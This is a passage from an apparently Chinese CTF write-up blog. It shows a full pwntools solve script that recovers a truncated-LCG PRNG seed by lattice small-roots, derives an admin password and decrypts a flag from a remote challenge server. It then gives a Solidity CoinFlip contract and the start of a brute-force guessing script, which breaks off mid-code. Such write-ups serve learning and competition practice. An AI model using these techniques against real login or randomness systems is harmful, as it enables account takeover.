(<span class="variable language_">self</span>.a * <span class="variable language_">self</span>.state + <span class="variable language_">self</span>.b) % <span class="variable language_">self</span>.p</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.state</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">randbytes</span>(<span class="params">self, n</span>):</span><br><span class="line">        out = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            out += <span class="built_in">bytes</span>([<span class="variable language_">self</span>.<span class="built_in">next</span>() % <span class="number">256</span>])</span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">choices</span>(<span class="params">self, seq, k</span>):</span><br><span class="line">        <span class="keyword">return</span> [seq[<span class="variable language_">self</span>.<span class="built_in">next</span>() % <span class="built_in">len</span>(seq)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(k)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getPrime</span>(<span class="params">self, n</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            num = <span class="variable language_">self</span>.randbytes(n // <span class="number">8</span>)</span><br><span class="line">            p = bytes_to_long(num) | (<span class="number">1</span> &lt;&lt; (n - <span class="number">1</span>)) | <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> isPrime(p):</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getrandbits</span>(<span class="params">self, n</span>):</span><br><span class="line">        num = <span class="variable language_">self</span>.randbytes((n + <span class="number">7</span>) // <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">return</span> bytes_to_long(num) &amp; ((<span class="number">1</span> &lt;&lt; n) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;a = <span class="subst">&#123;self.a&#125;</span>\nb = <span class="subst">&#123;self.b&#125;</span>\np = <span class="subst">&#123;self.p&#125;</span>&#x27;</span></span><br></pre></td></tr></table></figure>

<p>很显然可以知道，所有方法几乎都是围绕着 <code>randbytes</code> 实现的，而 <code>randbytes</code> 中每个字节的生成实际上是一个这样的递推关系：<br>$$Y_{n+1} &#x3D; [(aX_n + b) \mod p] \mod 256$$<br>其中 $Y_{n+1}$ 是 <code>randbytes</code> 的输出，$X_n$ 是PRNG内部状态，很明显，这是Truncated LCG (截断线性同余生成器)，根据同余性质实际上有：<br>$$X_n &#x3D; Y_n + 256k_n$$<br>所以上述递推式实际上等价于：<br>$$Y_{n+1} + 256k_{n+1} \equiv a(Y_n + 256k_n) + b \pmod{p}$$<br>因为 $a, b$ 都会给出，所以我们如果可以收集到足够多的样本 $Y_n$ 应该有可能通过构造格 (Lattice) 或者通过一种类似求小根的方式恢复出所有 $X_n &#x3D; Y_n + 256k_n$。</p>
<p>观察代码可以看到，每次登录的时候系统都会调用 <code>prng.randbytes(4)</code> 生成四个随机字节，如果我们连续登录 $n$ 次的话就可以获得 $4n$ 个prng的截断输出，从而尝试使用 CVP (最近向量问题) 相关的格攻击解方程组 $Y_{n+1} + 256k_{n+1} \equiv a(Y_n + 256k_n) + b \pmod{p}$ 得到 $k_n$，从而恢复出 seed，这样就可以恢复出 admin 的密码了，与此同时，因为我们恢复了 prng，所以加密 flag 用的 key 和 iv 也就搞到了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> cuso</span><br><span class="line"><span class="keyword">from</span> main <span class="keyword">import</span> PRNG</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;pwn-fc3efcd9ef.challenge.xctf.org.cn&quot;</span>, <span class="number">9999</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># menu = &quot;&quot;&quot;Flag Management System</span></span><br><span class="line"><span class="comment"># [L]ogin</span></span><br><span class="line"><span class="comment"># [G]et Public Key</span></span><br><span class="line"><span class="comment"># [R]ead Flag</span></span><br><span class="line"><span class="comment"># [E]xit&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得公钥</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;G&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;=&#x27;</span>)</span><br><span class="line">a = <span class="built_in">int</span>(io.recvline())</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;=&#x27;</span>)</span><br><span class="line">b = <span class="built_in">int</span>(io.recvline())</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;=&#x27;</span>)</span><br><span class="line">p = <span class="built_in">int</span>(io.recvline())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getVerify</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> io.recvline().strip()</span><br><span class="line"></span><br><span class="line">Y = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;L&#x27;</span>)</span><br><span class="line">    verify = getVerify()</span><br><span class="line"></span><br><span class="line">    Y += [<span class="built_in">int</span>(verify[i: i+<span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>, <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Username:&#x27;</span>, <span class="string">b&#x27;114514&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Password:&#x27;</span>, <span class="string">b&#x27;1919810&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;code:&#x27;</span>, verify)</span><br><span class="line"></span><br><span class="line">k = [var(<span class="string">f&#x27;k<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Y))]</span><br><span class="line">roots = cuso.find_small_roots(relations=[a * (Y[i] + <span class="number">256</span> * k[i]) + b - (Y[i + <span class="number">1</span>] + <span class="number">256</span> * k[i + <span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Y) - <span class="number">1</span>)], </span><br><span class="line">                              bounds=&#123;k[i]: (<span class="number">0</span>, <span class="number">2</span>**<span class="number">120</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Y))&#125;, </span><br><span class="line">                              modulus=[p <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Y) - <span class="number">1</span>)])</span><br><span class="line"></span><br><span class="line">x0 = Y[<span class="number">0</span>] + <span class="number">256</span> * roots[<span class="number">0</span>][k[<span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    x0 = (x0 - b) * <span class="built_in">pow</span>(a, -<span class="number">1</span>, p) % p</span><br><span class="line"></span><br><span class="line">prng = PRNG(a, b, p, x0)</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;&quot;</span>.join(prng.choices(ascii_letters + digits, <span class="number">32</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Recovered password: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;L&#x27;</span>)</span><br><span class="line">verify = getVerify()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Username:&#x27;</span>, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Password:&#x27;</span>, password.encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;code:&#x27;</span>, verify)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断种子是否被正确恢复</span></span><br><span class="line"><span class="keyword">assert</span> prng.randbytes(<span class="number">32</span>) == <span class="built_in">bytes</span>(Y)</span><br><span class="line">prng.randbytes(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;R&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(AES.new(prng.randbytes(<span class="number">16</span>), AES.MODE_CBC, prng.randbytes(<span class="number">16</span>)).decrypt(<span class="built_in">bytes</span>.fromhex(io.recvline().decode().strip())))</span><br></pre></td></tr></table></figure>

<h2><span id="blockchain">blockchain</span><a href="#blockchain" class="header-anchor"></a></h2><p>合约</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  event ConsecutiveWins(address,uint256);</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 private consecutiveWinNumber=10;</span><br><span class="line">  address private winer;</span><br><span class="line">  uint256 private lastNance;</span><br><span class="line">  string private key;</span><br><span class="line">  bool private isStart;</span><br><span class="line"></span><br><span class="line">  constructor(string memory _key) &#123;</span><br><span class="line">    require(keccak256(_key)!=keccak256(&quot;&quot;),&quot;please input key&quot;);</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">    key=_key;</span><br><span class="line">    isStart=false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   modifier onlyEOA()  &#123;</span><br><span class="line">    require(msg.sender==tx.origin,&quot;only EOA&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier verifyConsecutiveWins()&#123;</span><br><span class="line">    require(isStart==true,&quot;Game is not over&quot;);</span><br><span class="line">    require(consecutiveWins==consecutiveWinNumber&amp;&amp;winer!=address(0),&quot;no winner&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public onlyEOA returns (bool,string) &#123;</span><br><span class="line">    require(isStart==false,&quot;Game over!!&quot;);</span><br><span class="line">    uint256 nonce=uint256(keccak256(abi.encode(keccak256(lastNance),block.timestamp,blockhash(block.number - 1),block.difficulty,keccak256(tx.origin),keccak256(msg.sender))));</span><br><span class="line">    if (lastNance == nonce) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastNance = nonce;</span><br><span class="line">    uint256 coinFlip = uint256(uint256(nonce) % 2);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      if (consecutiveWins==consecutiveWinNumber)&#123;</span><br><span class="line">        winer=msg.sender;</span><br><span class="line">        emit ConsecutiveWins(msg.sender,consecutiveWinNumber);</span><br><span class="line">        isStart=true;</span><br><span class="line">        return (true,key);</span><br><span class="line">      &#125;</span><br><span class="line">      return (true,&quot;&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return (false,&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function verify() verifyConsecutiveWins public view returns(address,uint256,string) &#123;</span><br><span class="line">    return (winer,consecutiveWinNumber,key);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到下一次正反是由上一次的 nonce 以及 block 自己的属性等生成的，但是只猜 10 次，所以可以大力出奇迹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:3000/api/trans/handle&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://127.0.0.1:3000&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-ch-ua-mobile&quot;</span>: <span class="string">&quot;?0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-origin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;en-GB,en-US;q=0.9,en;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-ch-ua-platform&quot;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://127.0.0.1:3000/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br, zstd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;empty&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sec-ch-ua&quot;</span>: <span class="string">&#x27;&quot;Google Chrome&quot;;v=&quot;141&quot;, &quot;Not?A_Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;141&quot;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_guess</span>(<span class="params">b</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;groupId&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user&quot;</span>: <span class="string">&quot;0x9908bd276177e5b8f87c68e8d0097eab1959023d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;contractName&quot;</span>: <span class="string">&quot;CoinFlip&quot;</span>,</span><br><span class="line">        <span class="string">&quot;contractPath&quot;</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;version&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;funcName&quot;</span>: <span class="string">&quot;flip&quot;</span>,</span><br><span class="line">        <span class="string">&quot;funcParam&quot;</span>: [b], </span><br><span class="line">        <span class="string">&quot;contractAddress&quot;</span>: <span class="string">&quot;0x27f714e5ac1370580776803bae02dd2fb6ddb8f6&quot;</span>,</span><br><span class="line">        <span class="string">&quot;contractAbi&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;constant&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;inputs&quot;</span>: [&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;_guess&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;bool&quot;</span>&#125;],</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;flip&quot;</span>,</span><br><span class="line">                <span class="string">&quot;outputs&quot;</span>: [&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;bool&quot;</span>&#125;, &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>&#125;],</span><br><span class="line">                <span class="string">&quot;payable&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;nonpayable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;constant&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;inputs&quot;</span>: [],</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;consecutiveWins&quot;</span>,</span><br><span class="line">                <span class="string">&quot;outputs&quot;</span>: [&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;uint256&quot;</span>&#125;],</span><br><span class="line">                <span class="string">&quot;payable&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;view&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;constant&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">&quot;inputs&quot;</span>: [],</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;verify&quot;</span>,</span><br><span class="line">                <span class="string">&quot;outputs&quot;</span>: [&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;address&quot;</span>&#125;, &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;uint256&quot;</span>&#125;,</span><br><span class="line">                            &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>&#125;],</span><br><span class="line">                <span class="string">&quot;payable&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;view&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;inputs&quot;</span>: [&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;_key&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>&#125;],</span><br><span class="line">                <span class="string">&quot;payable&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;nonpayable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;constructor&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;anonymous&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;inputs&quot;</span>: [&#123;<span class="string">&quot;indexed&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;address&quot;</span>&#125;,</span><br><span class="line">                           &#123;<span class="string">&quot;indexed&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;uint256&quot;</span>&#125;],</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;ConsecutiveWins&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;event&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, data=json.dumps(data), headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response.status_code, response.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_num</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;groupId&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user&quot;</span>: <span class="string">&quot;0x9908bd276177e5b8f87c68e8d0097eab1959023d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;contractName&quot;</span>: <span class="string">&quot;CoinFlip&quot;</span>,</span><br><span class="line">        <span class="string">&quot;contractPath&quot;</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;version&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;funcName&quot;</span>: <span class="string">&quot;consecutiveWins&quot;</span>,</span><br><span class="line">        <span class="string">&quot;funcParam&quot;</span>: [],</span><br><span class="line">        <span class="string">&quot;contractAddress&quot;</span>: <span class="string">&quot;0x27f714e5ac1370580776803bae02dd2fb6ddb8f6&quot;</span>,</span><br><span class="line">        <span class="string">&quot;contractAbi&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;constant&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;inputs&quot;</span>: [&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;_guess&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;bool&quot;</span>&#125;],</span><br><span class="line">                <span class="string">&quot;name&quot;</span>: <span class="string">&quot;flip&quot;</span>,</span><br><span class="line">                <span class="string">&quot;outputs&quot;</span>: [&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;bool&quot;</span>&#125;, &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;string&quot;</span>&#125;],</span><br><span class="line">                <span class="string">&quot;payable&quot;</span>: <span class="literal">False</span>,</span><br><span class="line">                <span class="string">&quot;stateMutability&quot;</span>: <span class="string">&quot;nonpayable&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;constant&quot;</span>: <span 